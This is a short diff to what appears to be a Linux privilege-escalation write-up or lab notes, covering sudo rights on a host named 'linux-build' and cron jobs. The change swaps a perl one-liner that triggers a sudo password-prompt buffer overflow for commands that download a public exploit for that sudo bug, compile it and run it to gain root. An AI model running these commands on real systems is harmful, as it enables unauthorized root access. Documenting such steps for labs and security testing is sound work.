@@ -216,7 +216,9 @@ User user may run the following commands on linux-build:
 The bug can be reproduced by passing a large input to sudo via a pipe when it prompts for a password.
 
 ```text
-perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
+wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c -O exploit.c
+gcc -o exploit exploit.c
+./exploit
 ```
 
 ## Cron jobs
